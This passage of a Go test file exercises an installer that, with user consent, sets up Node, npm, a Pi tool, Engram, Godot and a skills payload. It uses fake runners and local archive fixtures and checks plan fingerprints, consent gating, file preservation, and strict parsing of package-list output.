package piinstall

import (
	"archive/tar"
	"context"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"

	ogsskills "open-game-studios/skills"
)

type fakeRunner struct {
	paths   map[string]string
	lookErr map[string]error
	runFn   func(CommandSpec) CommandResult
	calls   []CommandSpec
}

func (f *fakeRunner) LookPath(name string) (string, error) {
	if path, ok := f.paths[name]; ok {
		return path, nil
	}
	if err, ok := f.lookErr[name]; ok {
		return "", err
	}
	return "", fmt.Errorf("%s: not found", name)
}

func (f *fakeRunner) Run(_ context.Context, spec CommandSpec) CommandResult {
	f.calls = append(f.calls, spec)
	if f.runFn != nil {
		return f.runFn(spec)
	}
	return CommandResult{}
}

type fakeDownloader struct {
	files map[string]string
	err   error
	calls []string
}

func (d *fakeDownloader) Download(_ context.Context, rawURL, destPath string, maxBytes int64) error {
	d.calls = append(d.calls, rawURL)
	if d.err != nil {
		return d.err
	}
	path, ok := d.files[rawURL]
	if !ok {
		return fmt.Errorf("no local fixture registered for %s", rawURL)
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	if int64(len(data)) > maxBytes {
		return fmt.Errorf("fixture %s exceeds %d bytes", rawURL, maxBytes)
	}
	return os.WriteFile(destPath, data, 0o600)
}

// recordingDownloader wraps the fixture downloader and records every staging
// destination it is handed, so a test can observe where IO physically writes
// even though the executor removes its staging directory before returning. The
// optional onDownload callback runs at entry, before any bytes are written, so a
// test can inspect the filesystem while the executor is still mid-step and
// deferred cleanup cannot hide a wrongly chosen staging root.
type recordingDownloader struct {
	inner      *fakeDownloader
	dests      []string
	onDownload func(destPath string)
}

func (d *recordingDownloader) Download(ctx context.Context, rawURL, destPath string, maxBytes int64) error {
	d.dests = append(d.dests, destPath)
	if d.onDownload != nil {
		d.onDownload(destPath)
	}
	return d.inner.Download(ctx, rawURL, destPath, maxBytes)
}

type harnessOptions struct {
	npmInstallFails       bool
	listOutput            string
	piRequiresManagedNode bool
	omitNodeNpm           bool
	hostNodePath          string
	installRoot           string
}

type installHarness struct {
	cfg         Config
	plan        Plan
	runner      *fakeRunner
	downloader  *fakeDownloader
	installRoot string
	workspace   string
}

func newInstallHarness(t *testing.T, options harnessOptions) *installHarness {
	t.Helper()
	workspace := t.TempDir()
	installRoot := options.installRoot
	if installRoot == "" {
		installRoot = t.TempDir()
	}
	fixtures := t.TempDir()
	managedNodeBin := filepath.Join(installRoot, "node", "24.21.0", "bin")

	nodeCandidate, _ := CandidateFor(ComponentNode)
	engramCandidate, _ := CandidateFor(ComponentEngramCore)
	godotCandidate, _ := CandidateFor(ComponentGodot)

	nodeArchive := filepath.Join(fixtures, "node.tar.gz")
	nodeEntries := []tarEntry{
		{name: "node-v24.21.0-linux-x64/bin/node", mode: 0o755, typeflag: tar.TypeReg, data: []byte("node")},
		{name: "node-v24.21.0-linux-x64/lib/node_modules/npm/bin/npm-cli.js", mode: 0o644, typeflag: tar.TypeReg, data: []byte("npm")},
	}
	if !options.omitNodeNpm {
		nodeEntries = append(nodeEntries, tarEntry{name: "node-v24.21.0-linux-x64/bin/npm", mode: 0o777, typeflag: tar.TypeSymlink, link: "../lib/node_modules/npm/bin/npm-cli.js"})
	}
	writeTarGz(t, nodeArchive, nodeEntries)
	engramArchive := filepath.Join(fixtures, "engram.tar.gz")
	writeTarGz(t, engramArchive, []tarEntry{
		{name: "engram", mode: 0o755, typeflag: tar.TypeReg, data: []byte("engram")},
	})
	godotArchive := filepath.Join(fixtures, "godot.zip")
	writeZip(t, godotArchive, []zipEntry{
		{name: "Godot_v4.7.2-stable_linux.x86_64", mode: 0o755, data: []byte("godot")},
	})

	downloader := &fakeDownloader{files: map[string]string{
		nodeCandidate.Source:   nodeArchive,
		engramCandidate.Source: engramArchive,
		godotCandidate.Source:  godotArchive,
	}}

	installedPackages := map[string]bool{}
	runner := &fakeRunner{paths: map[string]string{}}
	if options.hostNodePath != "" {
		runner.paths["node"] = options.hostNodePath
	}
	runner.runFn = func(spec CommandSpec) CommandResult {
		base := filepath.Base(spec.Name)
		joined := strings.Join(spec.Args, " ")
		switch {
		case base == "node" && joined == "--version":
			return CommandResult{Stdout: "v24.21.0\n"}
		case base == "npm" && joined == "--version":
			return CommandResult{Stdout: "11.19.0\n"}
		case base == "npm" && len(spec.Args) > 0 && spec.Args[0] == "install":
			if options.npmInstallFails {
				return CommandResult{ExitCode: 1, Stderr: "npm error simulated failure"}
			}
			prefix := ""
			for index, arg := range spec.Args {
				if arg == "--prefix" && index+1 < len(spec.Args) {
					prefix = spec.Args[index+1]
				}
			}
			if prefix == "" {
				return CommandResult{ExitCode: 1, Stderr: "missing --prefix"}
			}
			piBinary := filepath.Join(prefix, "bin", "pi")
			if err := os.MkdirAll(filepath.Dir(piBinary), 0o755); err != nil {
				return CommandResult{ExitCode: 1, Stderr: err.Error()}
			}
			if err := os.WriteFile(piBinary, []byte("#!/bin/sh\n"), 0o755); err != nil {
				return CommandResult{ExitCode: 1, Stderr: err.Error()}
			}
			return CommandResult{Stdout: "added 1 package\n"}
		case base == "pi" && joined == "--version":
			if options.piRequiresManagedNode && !envHasPathDir(spec.Env, managedNodeBin) {
				return CommandResult{ExitCode: 127, Stderr: "node: command not found"}
			}
			return CommandResult{Stdout: "0.87.1\n"}
		case base == "pi" && joined == "list --no-approve":
			if options.listOutput != "" {
				return CommandResult{Stdout: options.listOutput + "\n"}
			}
			return packageListResult(installedPackages)
		case base == "pi" && len(spec.Args) > 0 && spec.Args[0] == "install":
			installedPackages[spec.Args[1]] = true
			return CommandResult{Stdout: "Installed " + spec.Args[1] + "\n"}
		case base == "engram" && joined == "--version":
			return CommandResult{Stdout: "engram version 2.2.0\n"}
		case strings.HasPrefix(base, "Godot_v") && strings.Contains(joined, "--version"):
			return CommandResult{Stdout: "4.7.2.stable.official\n"}
		}
		return CommandResult{ExitCode: 127, Stderr: "unexpected command: " + base + " " + joined}
	}

	cfg := Config{
		WorkspaceDir:  workspace,
		InstallRoot:   installRoot,
		GodotRequired: true,
		Commands:      runner,
		Downloader:    downloader,
		archiveDigests: map[Component]archiveDigestOverride{
			ComponentNode:       {sha: digestOf(t, nodeArchive), size: fileSizeOf(t, nodeArchive)},
			ComponentEngramCore: {sha: digestOf(t, engramArchive), size: fileSizeOf(t, engramArchive)},
			ComponentGodot:      {sha: digestOf(t, godotArchive), size: fileSizeOf(t, godotArchive)},
		},
	}

	_, plan, err := Prepare(context.Background(), cfg)
	if err != nil {
		t.Fatalf("Prepare failed: %v", err)
	}
	return &installHarness{cfg: cfg, plan: plan, runner: runner, downloader: downloader, installRoot: installRoot, workspace: workspace}
}

func packageListResult(packages map[string]bool) CommandResult {
	if len(packages) == 0 {
		return CommandResult{Stdout: "No packages installed.\n"}
	}
	names := make([]string, 0, len(packages))
	for name := range packages {
		names = append(names, name)
	}
	sort.Strings(names)
	var builder strings.Builder
	builder.WriteString("User packages:\n")
	for _, name := range names {
		fmt.Fprintf(&builder, "  %s\n", name)
	}
	builder.WriteString("    /home/user/.pi/packages/example\n")
	return CommandResult{Stdout: builder.String()}
}

func digestOf(t *testing.T, path string) string {
	t.Helper()
	digest, err := sha256File(path)
	if err != nil {
		t.Fatalf("digest %s: %v", path, err)
	}
	return digest
}

func fileSizeOf(t *testing.T, path string) int64 {
	t.Helper()
	info, err := os.Stat(path)
	if err != nil {
		t.Fatalf("stat %s: %v", path, err)
	}
	return info.Size()
}

func assertDirEmpty(t *testing.T, dir string) {
	t.Helper()
	entries, err := os.ReadDir(dir)
	if err != nil {
		t.Fatalf("read dir %s: %v", dir, err)
	}
	if len(entries) != 0 {
		t.Fatalf("expected %s to remain empty, found %v", dir, entries)
	}
}

func envHasPathDir(env []string, dir string) bool {
	for _, entry := range env {
		if !strings.HasPrefix(entry, "PATH=") {
			continue
		}
		for _, part := range filepath.SplitList(strings.TrimPrefix(entry, "PATH=")) {
			if part == dir {
				return true
			}
		}
	}
	return false
}

// assertNpmInstallUsesSelectedNode checks that every bootstrap `npm install`
// child (the one that installs Pi) carries the selected Node runtime and never
// exposes the npm-provider bundle's own bin directory. That bootstrap invokes
// npm by absolute path, so it does not need the provider dir on PATH; Pi's own
// later `pi install` path is covered separately by
// TestPiPackageInstallFindsProviderNpmOnPath.
func assertNpmInstallUsesSelectedNode(t *testing.T, calls []CommandSpec, selectedBin, bundleBin string) {
	t.Helper()
	found := false
	for _, call := range calls {
		if filepath.Base(call.Name) != "npm" || len(call.Args) == 0 || call.Args[0] != "install" {
			continue
		}
		found = true
		if !envHasPathDir(call.Env, selectedBin) {
			t.Errorf("npm install child PATH is missing the selected Node bin %q: %v", selectedBin, call.Env)
		}
		if envHasPathDir(call.Env, bundleBin) {
			t.Errorf("npm install child PATH must not expose the npm-provider bundle bin %q: %v", bundleBin, call.Env)
		}
	}
	if !found {
		t.Fatalf("expected at least one npm install command")
	}
}

func clonePlan(plan Plan) Plan {
	clone := plan
	clone.Steps = make([]PlanStep, len(plan.Steps))
	for index, step := range plan.Steps {
		step.Outputs = append([]string(nil), step.Outputs...)
		step.Effects = append([]string(nil), step.Effects...)
		clone.Steps[index] = step
	}
	return clone
}

func TestPreviewIsZeroWriteAndDeclineWritesNothing(t *testing.T) {
	workspace := t.TempDir()
	installRoot := t.TempDir()
	runner := &fakeRunner{}
	downloader := &fakeDownloader{}
	cfg := Config{WorkspaceDir: workspace, InstallRoot: installRoot, Commands: runner, Downloader: downloader}

	_, plan, err := Prepare(context.Background(), cfg)
	if err != nil {
		t.Fatalf("Prepare failed: %v", err)
	}
	if len(downloader.calls) != 0 {
		t.Fatalf("preview performed downloads: %v", downloader.calls)
	}
	for _, call := range runner.calls {
		if len(call.Args) > 0 && (call.Args[0] == "list" || call.Args[0] == "install") {
			t.Fatalf("preview ran a package command that initializes bootstrap settings: %v", call)
		}
	}
	assertDirEmpty(t, installRoot)

	report, err := Execute(context.Background(), cfg, plan, Consent{})
	if !errors.Is(err, ErrConsentRequired) {
		t.Fatalf("expected ErrConsentRequired, got %v", err)
	}
	if report.Failed {
		t.Fatalf("declined plan must not be marked failed")
	}
	if len(report.Entries) == 0 {
		t.Fatalf("expected declined entries")
	}
	for _, entry := range report.Entries {
		if entry.Outcome != OutcomeDeclined {
			t.Errorf("expected declined outcome for %s, got %s", entry.Component, entry.Outcome)
		}
	}
	assertDirEmpty(t, installRoot)
	if _, err := os.Stat(filepath.Join(workspace, ".pi")); !os.IsNotExist(err) {
		t.Errorf("decline must not create workspace payload output")
	}
}

func TestExecuteRequiresMatchingFingerprintAndNonBlockedPlan(t *testing.T) {
	workspace := t.TempDir()
	installRoot := t.TempDir()
	cfg := Config{WorkspaceDir: workspace, InstallRoot: installRoot, Commands: &fakeRunner{}, Downloader: &fakeDownloader{}}
	_, plan, err := Prepare(context.Background(), cfg)
	if err != nil {
		t.Fatalf("Prepare failed: %v", err)
	}
	if _, err := Execute(context.Background(), cfg, plan, Consent{Approved: true, PlanFingerprint: "deadbeef"}); !errors.Is(err, ErrPlanDrift) {
		t.Fatalf("expected ErrPlanDrift, got %v", err)
	}

	detection := Detection{States: []ComponentState{
		{Component: ComponentNode, Found: true, Path: "/usr/bin/node", Version: "24.21.0", Compatibility: CompatCompatible},
		{Component: ComponentNpm, Found: true, Path: "/usr/bin/npm", Version: "11.19.0", Compatibility: CompatCompatible},
		{Component: ComponentPi, Found: true, Path: "/usr/bin/pi", Version: "0.10.0", Compatibility: CompatIncompatible, Detail: "version below minimum"},
		{Component: ComponentEngramCore, Compatibility: CompatAbsent},
		{Component: ComponentOGSPayload, Path: payloadDestination(workspace), Compatibility: CompatAbsent},
	}}
	blocked := BuildPlan(cfg, detection)
	if !blocked.Blocked() {
		t.Fatalf("expected plan with an incompatible Pi to be blocked")
	}
	if _, err := Execute(context.Background(), cfg, blocked, Consent{Approved: true, PlanFingerprint: blocked.Fingerprint()}); !errors.Is(err, ErrPlanBlocked) {
		t.Fatalf("expected ErrPlanBlocked, got %v", err)
	}
	assertDirEmpty(t, installRoot)
}

func TestDetectClassifiesReuseAndIncompatibleComponents(t *testing.T) {
	runner := &fakeRunner{
		paths: map[string]string{"node": "/usr/bin/node", "npm": "/usr/bin/npm", "pi": "/usr/bin/pi", "engram": "/usr/bin/engram"},
		runFn: func(spec CommandSpec) CommandResult {
			switch filepath.Base(spec.Name) {
			case "node":
				return CommandResult{Stdout: "v24.21.0\n"}
			case "npm":
				return CommandResult{Stdout: "11.19.0\n"}
			case "pi":
				return CommandResult{Stdout: "0.87.1\n"}
			case "engram":
				return CommandResult{Stdout: "1.0.0\n"}
			}
			return CommandResult{ExitCode: 127}
		},
	}
	cfg := Config{WorkspaceDir: t.TempDir(), InstallRoot: t.TempDir(), Commands: runner, Downloader: &fakeDownloader{}}
	detection, err := Detect(context.Background(), cfg)
	if err != nil {
		t.Fatalf("Detect failed: %v", err)
	}

	expectations := map[Component]Compatibility{
		ComponentNode:       CompatCompatible,
		ComponentNpm:        CompatCompatible,
		ComponentPi:         CompatCompatible,
		ComponentEngramCore: CompatIncompatible,
		ComponentShell:      CompatUnknown,
	}
	for component, want := range expectations {
		state, ok := detection.State(component)
		if !ok {
			t.Fatalf("missing state for %s", component)
		}
		if state.Compatibility != want {
			t.Errorf("%s compatibility = %s, want %s", component, state.Compatibility, want)
		}
	}
	shell, _ := detection.State(ComponentShell)
	if !shell.ProbeDeferred {
		t.Errorf("Shell presence must be deferred to post-consent probing")
	}
}

func TestExecuteInstallsMissingPrerequisitesWithConsent(t *testing.T) {
	harness := newInstallHarness(t, harnessOptions{})
	if harness.plan.Blocked() {
		t.Fatalf("happy-path plan must not be blocked: %+v", harness.plan.Steps)
	}
	if !harness.plan.NeedsConsent() {
		t.Fatalf("install plan must require consent")
	}
	for _, call := range harness.runner.calls {
		if len(call.Args) > 0 && (call.Args[0] == "list" || call.Args[0] == "install") {
			t.Fatalf("preview ran a mutating package command: %v", call)
		}
	}

	report, err := Execute(context.Background(), harness.cfg, harness.plan, Consent{Approved: true, PlanFingerprint: harness.plan.Fingerprint()})
	if err != nil {
		t.Fatalf("Execute returned error: %v", err)
	}
	if report.Failed {
		t.Fatalf("report marked failed: %+v", report.Entries)
	}

	wantLaunch := LaunchInfo{
		PiExecutable:  filepath.Join(harness.installRoot, "pi", "0.87.1", "bin", "pi"),
		PiPrefix:      filepath.Join(harness.installRoot, "pi", "0.87.1"),
		NodeBinDir:    filepath.Join(harness.installRoot, "node", "24.21.0", "bin"),
		NpmExecutable: filepath.Join(harness.installRoot, "node", "24.21.0", "bin", "npm"),
		EngramBinary:  filepath.Join(harness.installRoot, "engram", "2.2.0", "engram"),
		GodotBinary:   filepath.Join(harness.installRoot, "godot", "4.7.2", "Godot_v4.7.2-stable_linux.x86_64"),
	}
	if report.Launch.PiExecutable != wantLaunch.PiExecutable {
		t.Errorf("PiExecutable = %q, want %q", report.Launch.PiExecutable, wantLaunch.PiExecutable)
	}
	if report.Launch.PiPrefix != wantLaunch.PiPrefix {
		t.Errorf("PiPrefix = %q, want %q", report.Launch.PiPrefix, wantLaunch.PiPrefix)
	}
	if report.Launch.NodeBinDir != wantLaunch.NodeBinDir {
		t.Errorf("NodeBinDir = %q, want %q", report.Launch.NodeBinDir, wantLaunch.NodeBinDir)
	}
	if report.Launch.EngramBinary != wantLaunch.EngramBinary {
		t.Errorf("EngramBinary = %q, want %q", report.Launch.EngramBinary, wantLaunch.EngramBinary)
	}
	if report.Launch.GodotBinary != wantLaunch.GodotBinary {
		t.Errorf("GodotBinary = %q, want %q", report.Launch.GodotBinary, wantLaunch.GodotBinary)
	}
	if len(report.Launch.PathAdditions) == 0 || report.Launch.PathAdditions[0] != filepath.Join(harness.installRoot, "engram", "2.2.0") {
		t.Errorf("expected Engram PATH addition, got %v", report.Launch.PathAdditions)
	}

	outcomes := map[Component]Outcome{}
	for _, entry := range report.Entries {
		outcomes[entry.Component] = entry.Outcome
	}
	installed := []Component{ComponentNode, ComponentPi, ComponentEngramCore, ComponentGodot, ComponentOGSPayload}
	for _, component := range installed {
		if outcomes[component] != OutcomeInstalled {
			t.Errorf("%s outcome = %s, want installed", component, outcomes[component])
		}
	}
	for _, component := range []Component{ComponentShell, ComponentEngramCompanion} {
		if outcomes[component] != OutcomeInstalled {
			t.Errorf("%s outcome = %s, want installed", component, outcomes[component])
		}
	}

	for _, group := range ogsskills.Groups() {
		for _, rel := range group.Files {
			target := filepath.Join(harness.workspace, filepath.FromSlash(ogsskills.SkillsRoot), group.Dir, filepath.FromSlash(rel))
			if _, err := os.Stat(target); err != nil {
				t.Errorf("payload file %s/%s missing: %v", group.Dir, rel, err)
			}
		}
	}
	if len(report.Notes) == 0 || !strings.Contains(strings.Join(report.Notes, " "), "/reload") {
		t.Errorf("expected Pi trust/reload guidance in the report notes, got %v", report.Notes)
	}

	entries, err := os.ReadDir(harness.installRoot)
	if err != nil {
		t.Fatalf("read install root: %v", err)
	}
	for _, entry := range entries {
		if strings.HasPrefix(entry.Name(), ".ogs-") {
			t.Errorf("leftover staging directory %s", entry.Name())
		}
	}
}

func TestExecuteStopsOnCommandFailureAndReportsPartialState(t *testing.T) {
	harness := newInstallHarness(t, harnessOptions{npmInstallFails: true})
	report, err := Execute(context.Background(), harness.cfg, harness.plan, Consent{Approved: true, PlanFingerprint: harness.plan.Fingerprint()})
	if err != nil {
		t.Fatalf("Execute returned error: %v", err)
	}
	if !report.Failed {
		t.Fatalf("expected failed report")
	}
	outcomes := map[Component]Outcome{}
	for _, entry := range report.Entries {
		outcomes[entry.Component] = entry.Outcome
	}
	if outcomes[ComponentNode] != OutcomeInstalled {
		t.Errorf("Node outcome = %s, want installed before the failure", outcomes[ComponentNode])
	}
	if outcomes[ComponentPi] != OutcomeFailed {
		t.Errorf("Pi outcome = %s, want failed", outcomes[ComponentPi])
	}
	if _, ok := outcomes[ComponentShell]; ok {
		t.Errorf("Shell must not run after a Pi failure")
	}
	if _, err := os.Stat(filepath.Join(harness.workspace, ".pi")); !os.IsNotExist(err) {
		t.Errorf("payload must not be written after an earlier failure")
	}
}

func TestExecuteFailsClosedOnUnknownPackageListOutput(t *testing.T) {
	harness := newInstallHarness(t, harnessOptions{listOutput: "unexpected human output"})
	report, err := Execute(context.Background(), harness.cfg, harness.plan, Consent{Approved: true, PlanFingerprint: harness.plan.Fingerprint()})
	if err != nil {
		t.Fatalf("Execute returned error: %v", err)
	}
	if !report.Failed {
		t.Fatalf("expected failed report on unverifiable package listing")
	}
	last := report.Entries[len(report.Entries)-1]
	if last.Component != ComponentShell || last.Outcome != OutcomeUnverified {
		t.Fatalf("expected Shell unverified, got %+v", last)
	}
	if _, err := os.Stat(filepath.Join(harness.workspace, ".pi")); !os.IsNotExist(err) {
		t.Errorf("payload must not be written when package classification fails")
	}
}

func TestExecuteFailsClosedOnStaleApprovedPlan(t *testing.T) {
	workspace := t.TempDir()
	installRoot := t.TempDir()
	runner := &fakeRunner{}
	cfg := Config{WorkspaceDir: workspace, InstallRoot: installRoot, Commands: runner, Downloader: &fakeDownloader{}}
	_, plan, err := Prepare(context.Background(), cfg)
	if err != nil {
		t.Fatalf("Prepare failed: %v", err)
	}

	runner.paths = map[string]string{"node": "/usr/bin/node"}
	runner.runFn = func(spec CommandSpec) CommandResult {
		if filepath.Base(spec.Name) == "node" {
			return CommandResult{Stdout: "v24.21.0\n"}
		}
		return CommandResult{ExitCode: 127}
	}

	report, err := Execute(context.Background(), cfg, plan, Consent{Approved: true, PlanFingerprint: plan.Fingerprint()})
	if err != nil {
		t.Fatalf("Execute returned error: %v", err)
	}
	if !report.Failed {
		t.Fatalf("expected stale plan to fail closed")
	}
	last := report.Entries[len(report.Entries)-1]
	if last.Outcome != OutcomeFailed || !strings.Contains(last.Detail, "stale") {
		t.Fatalf("expected stale-plan failure, got %+v", last)
	}
	assertDirEmpty(t, installRoot)
}

func TestInstallPayloadPreservesModifiedFiles(t *testing.T) {
	workspace := t.TempDir()
	destination := payloadDestination(workspace)
	if err := os.MkdirAll(filepath.Join(destination, "ogs-godot-change"), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	modified := []byte("# locally edited skill\n")
	if err := os.WriteFile(filepath.Join(destination, "ogs-godot-change", "SKILL.md"), modified, 0o644); err != nil {
		t.Fatalf("seed modified file: %v", err)
	}

	report, err := installPayload(workspace)
	if err != nil {
		t.Fatalf("installPayload failed: %v", err)
	}
	statuses := map[string]string{}
	for _, file := range report.Files {
		statuses[file.RelativePath] = file.Status
	}
	if statuses["ogs-godot-change/SKILL.md"] != PayloadPreserved {
		t.Errorf("modified SKILL.md status = %q, want preserved", statuses["ogs-godot-change/SKILL.md"])
	}
	if statuses["ogs-godot-change/references/godot-setup.md"] != PayloadInstalled {
		t.Errorf("missing reference status = %q, want installed", statuses["ogs-godot-change/references/godot-setup.md"])
	}
	if statuses["ogs-core/SKILL.md"] != PayloadInstalled {
		t.Errorf("missing sibling skill status = %q, want installed", statuses["ogs-core/SKILL.md"])
	}
	preserved, err := os.ReadFile(filepath.Join(destination, "ogs-godot-change", "SKILL.md"))
	if err != nil {
		t.Fatalf("read preserved file: %v", err)
	}
	if string(preserved) != string(modified) {
		t.Errorf("modified SKILL.md was overwritten")
	}
}

// TestInstallPayloadDestinationsAndReportPathsAreExact pins the shared root and
// every per-file sibling destination and report path, including the unchanged
// legacy skill destination.
func TestInstallPayloadDestinationsAndReportPathsAreExact(t *testing.T) {
	workspace := t.TempDir()
	report, err := installPayload(workspace)
	if err != nil {
		t.Fatalf("installPayload failed: %v", err)
	}
	sharedRoot := filepath.Join(workspace, ".pi", "skills")
	if report.Destination != sharedRoot {
		t.Fatalf("Destination = %q, want shared root %q", report.Destination, sharedRoot)
	}
	wantPaths := []string{
		"ogs-godot-change/SKILL.md",
		"ogs-godot-change/references/godot-setup.md",
		"ogs-core/SKILL.md",
		"ogs-core/references/handoff-contract.md",
	}
	if len(report.Files) != len(wantPaths) {
		t.Fatalf("report.Files = %+v, want %d entries", report.Files, len(wantPaths))
	}
	for index, want := range wantPaths {
		file := report.Files[index]
		if file.RelativePath != want {
			t.Errorf("report.Files[%d].RelativePath = %q, want %q", index, file.RelativePath, want)
		}
		if file.Status != PayloadInstalled {
			t.Errorf("report.Files[%d].Status = %q, want installed", index, file.Status)
		}
		installed := filepath.Join(sharedRoot, filepath.FromSlash(want))
		if _, err := os.Stat(installed); err != nil {
			t.Errorf("installed file %s missing: %v", installed, err)
		}
	}
	legacy := filepath.Join(sharedRoot, "ogs-godot-change", "SKILL.md")
	embedded, err := ogsskills.ReadGroupFile("ogs-godot-change", "SKILL.md")
	if err != nil {
		t.Fatalf("ReadGroupFile failed: %v", err)
	}
	onDisk, err := os.ReadFile(legacy)
	if err != nil {
		t.Fatalf("legacy skill path missing: %v", err)
	}
	if string(onDisk) != string(embedded) {
		t.Errorf("legacy skill path bytes differ from the embedded file")
	}
}

// TestInstallPayloadPreservesUnrelatedSiblings proves an unrelated sibling skill
// and settings file are neither touched nor reported.
func TestInstallPayloadPreservesUnrelatedSiblings(t *testing.T) {
	workspace := t.TempDir()
	sharedRoot := filepath.Join(workspace, ".pi", "skills")
	siblingDir := filepath.Join(sharedRoot, "some-other-skill")
	if err := os.MkdirAll(siblingDir, 0o755); err != nil {
		t.Fatalf("mkdir sibling: %v", err)
	}
	sibling := []byte("# unrelated sibling skill\n")
	if err := os.WriteFile(filepath.Join(siblingDir, "SKILL.md"), sibling, 0o644); err != nil {
		t.Fatalf("write sibling: %v", err)
	}
	settings := []byte("{}\n")
	if err := os.WriteFile(filepath.Join(workspace, ".pi", "settings.json"), settings, 0o644); err != nil {
		t.Fatalf("write settings: %v", err)
	}

	report, err := installPayload(workspace)
	if err != nil {
		t.Fatalf("installPayload failed: %v", err)
	}
	for _, file := range report.Files {
		if strings.Contains(file.RelativePath, "some-other-skill") {
			t.Errorf("report claims an unrelated sibling: %q", file.RelativePath)
		}
	}
	gotSibling, err := os.ReadFile(filepath.Join(siblingDir, "SKILL.md"))
	if err != nil || string(gotSibling) != string(sibling) {
		t.Errorf("unrelated sibling skill changed: err=%v", err)
	}
	gotSettings, err := os.ReadFile(filepath.Join(workspace, ".pi", "settings.json"))
	if err != nil || string(gotSettings) != string(settings) {
		t.Errorf("unrelated .pi/settings.json changed: err=%v", err)
	}
}

// TestInstallPayloadSecondRunIsIdentical proves a repeated install reuses every
// file without writing.
func TestInstallPayloadSecondRunIsIdentical(t *testing.T) {
	workspace := t.TempDir()
	if _, err := installPayload(workspace); err != nil {
		t.Fatalf("first installPayload failed: %v", err)
	}
	second, err := installPayload(workspace)
	if err != nil {
		t.Fatalf("second installPayload failed: %v", err)
	}
	for _, file := range second.Files {
		if file.Status != PayloadIdentical {
			t.Errorf("%s status = %q, want identical", file.RelativePath, file.Status)
		}
	}
}

func TestClassifyPiPackageList(t *testing.T) {
	cases := []struct {
		name   string
		output string
		want   packageListClass
	}{
		{name: "exact personal registration", output: "User packages:\n  npm:gentle-pi@3.7.0\n    /home/u/.pi/x\n", want: listPresent},
		{name: "absent", output: "User packages:\n  npm:other-package@1.0.0\n", want: listAbsent},
		{name: "no packages", output: "No packages installed.\n", want: listAbsent},
		{name: "conflict", output: "User packages:\n  npm:gentle-pi@3.6.0\n", want: listConflict},
		{name: "filtered is hidden", output: "User packages:\n  npm:gentle-pi@3.7.0 (filtered)\n", want: listUnverified},
		{name: "unverified", output: "some unexpected output\n", want: listUnverified},
		{name: "empty", output: "", want: listUnverified},
		{name: "unknown row before exact match", output: "User packages:\n  weird-row\n  npm:gentle-pi@3.7.0\n", want: listUnverified},
		{name: "unknown row after exact match", output: "User packages:\n  npm:gentle-pi@3.7.0\n  weird-row\n", want: listUnverified},
		{name: "conflicting version after exact match", output: "User packages:\n  npm:gentle-pi@3.7.0\n  npm:gentle-pi@3.6.0\n", want: listConflict},
		{name: "scoped ambiguity", output: "User packages:\n  npm:gentle-pi@3.7.0\nProject packages:\n  npm:gentle-pi@3.7.0\n", want: listConflict},
		{name: "project scope only", output: "Project packages:\n  npm:gentle-pi@3.7.0\n", want: listConflict},
		{name: "record before any header", output: "npm:gentle-pi@3.7.0\n", want: listUnverified},
		{name: "malformed npm record", output: "User packages:\n  npm:gentle-pi\n", want: listUnverified},
		{name: "duplicate same scope", output: "User packages:\n  npm:gentle-pi@3.7.0\n  npm:gentle-pi@3.7.0\n", want: listUnverified},
		{name: "heading without records", output: "User packages:\n", want: listUnverified},
		{name: "project heading mixed with no packages marker", output: "Project packages:\nNo packages installed.\n", want: listUnverified},
		{name: "no packages marker alongside a populated section", output: "User packages:\n  npm:gentle-pi@3.7.0\nNo packages installed.\n", want: listUnverified},
		{name: "empty project section after a populated user section", output: "User packages:\n  npm:gentle-pi@3.7.0\nProject packages:\n", want: listUnverified},
		{name: "only an orphan detail line", output: "    /home/u/.pi/x\n", want: listUnverified},
		{name: "bare git record", output: "User packages:\n  git:\n", want: listUnverified},
		{name: "whitespace-only git payload", output: "User packages:\n  git:   \n", want: listUnverified},
		{name: "malformed git payload", output: "User packages:\n  git:@@@\n", want: listUnverified},
		{name: "exact target followed by a bare git record", output: "User packages:\n  npm:gentle-pi@3.7.0\n  git:\n", want: listUnverified},
		{name: "supported git record does not prove the target absent", output: "User packages:\n  git:github.com/example/pi-tools@v1\n", want: listAbsent},
		{name: "supported scp-style git record is recognized", output: "User packages:\n  git:git@github.com:user/repo\n    /home/u/.pi/git/repo\n", want: listAbsent},
		{name: "supported https git url is recognized", output: "User packages:\n  git:https://github.com/user/repo\n", want: listAbsent},
		{name: "supported ssh git url is recognized", output: "User packages:\n  git:ssh://git@github.com/user/repo\n", want: listAbsent},
		{name: "url missing double slash", output: "User packages:\n  git:https:/\n", want: listUnverified},
		{name: "url scheme only", output: "User packages:\n  git:https:\n", want: listUnverified},
		{name: "url double slash without host or path", output: "User packages:\n  git:https://\n", want: listUnverified},
		{name: "url missing host", output: "User packages:\n  git:https:///user/repo\n", want: listUnverified},
		{name: "url host without repository path", output: "User packages:\n  git:https://github.com\n", want: listUnverified},
		{name: "malformed ssh url with single slash", output: "User packages:\n  git:ssh:/user/repo\n", want: listUnverified},
		{name: "malformed ssh url with empty host", output: "User packages:\n  git:ssh://\n", want: listUnverified},
		{name: "malformed ssh url with triple slash", output: "User packages:\n  git:ssh:///user/repo\n", want: listUnverified},
		{name: "whitespace inside git url", output: "User packages:\n  git:https://git hub.com/user/repo\n", want: listUnverified},
		{name: "exact target followed by a malformed git url record", output: "User packages:\n  npm:gentle-pi@3.7.0\n  git:https://\n", want: listUnverified},
		{name: "exact target followed by a port-only authority", output: "User packages:\n  npm:gentle-pi@3.7.0\n  git:https://:443/user/repo\n", want: listUnverified},
		{name: "port-only authority record", output: "User packages:\n  git:https://:443/user/repo\n", want: listUnverified},
		{name: "userinfo without hostname record", output: "User packages:\n  git:https://user@/user/repo\n", want: listUnverified},
		{name: "exact target followed by an unsupported ftp scheme", output: "User packages:\n  npm:gentle-pi@3.7.0\n  git:ftp://github.com/user/repo\n", want: listUnverified},
		{name: "arbitrary hierarchical ftp scheme record", output: "User packages:\n  git:ftp://github.com/user/repo\n", want: listUnverified},
		{name: "http scheme record stays unverified", output: "User packages:\n  git:http://github.com/user/repo\n", want: listUnverified},
		{name: "git scheme record stays unverified", output: "User packages:\n  git:git://github.com/user/repo\n", want: listUnverified},
		{name: "supported ssh control with explicit port", output: "User packages:\n  git:ssh://git@github.com:22/user/repo\n", want: listAbsent},
		// Shared repository/ref contract: a source that only looks like a
		// recognized shape but has no meaningful namespace/repository structure
		// must fail the whole COMPLETE listing closed, never certify the target
		// absent or present. Exercised alone, after an unrelated npm record, and
		// after the exact target.
